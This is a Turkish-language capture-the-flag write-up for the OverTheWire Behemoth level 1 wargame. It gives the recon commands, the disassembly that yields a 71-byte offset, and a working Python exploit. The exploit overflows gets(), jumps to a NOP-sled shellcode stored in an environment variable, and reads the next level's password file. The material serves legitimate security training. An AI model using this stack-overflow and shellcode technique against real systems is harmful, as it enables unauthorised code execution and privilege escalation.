# OverTheWire — Behemoth Level 1 → 2

> Hedef: `behemoth1`'den `behemoth2` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `gets()` sınırsız stack overflow → env'deki NOP sled+shellcode'a atlama.

---

## 1. Bağlantı
```bash
ssh behemoth1@behemoth.labs.overthewire.org -p 2221
```

## 2. Recon
```bash
readelf -l /behemoth/behemoth1 | grep GNU_STACK   # RWE -> executable stack
echo "AAAA" | ltrace /behemoth/behemoth1
# printf("Password: ")
# gets(0xffffd365, ...)        <-- gets, SINIRSIZ
# puts("Authentication failure.\nSorry.")
python3 -c "print('A'*100)" | /behemoth/behemoth1   # Segmentation fault -> EIP ezildi
```

## 3. Zafiyet + offset (disasm)
```
8049189:  sub esp, 0x44
8049199:  lea eax, [ebp-0x43]    ; buf = ebp-0x43
804919d:  call gets@plt          ; gets(buf) — sınır yok
```
`buf = ebp-0x43`, saved EIP `ebp+4` → offset = `0x43 + 4 = **71**`. Canary yok, stack RWE, ASLR kapalı.

## 4. Exploit
Shellcode'u `EGG`'e büyük NOP sled (40000) ile koy, adresini getenvaddr (19-char path =
`len("/behemoth/behemoth1")`) ile bul:
```bash
cd /tmp
export EGG=$(python3 -c 'b"\x90"*40000 + SHELLCODE_57')      # setreuid+execve("/bin/sh")
ADDR=$(/tmp/bhm1getenvaddr EGG | ...)
RET=$((0x$ADDR + 20000))                                     # sled ortası
# gets stdin'den okur -> payload = "A"*71 + RET + "\n", sonra timed komut
python3 -c "
import sys,time,struct
ret=int('$RET',16)
sys.stdout.buffer.write(b'A'*71 + struct.pack('<I',ret) + b'\n'); sys.stdout.flush(); time.sleep(1.0)
sys.stdout.buffer.write(b'id; cat /etc/behemoth_pass/behemoth2\n'); sys.stdout.flush(); time.sleep(1.0)
" | /behemoth/behemoth1
```
Çıktı: `uid=13002(behemoth2)` → şifre.


## Dersler
| Konu | Not |
|------|-----|
| `gets()` | Sınırsız → klasik stack overflow, EIP ezme |
| offset 71 | `buf=ebp-0x43` → 67+4 |
| env shellcode | RWE stack + ASLR yok → env'de sled+shellcode, ret oraya |
| stdio buffering | `gets` slurp eder → payload+komut zamanlı |


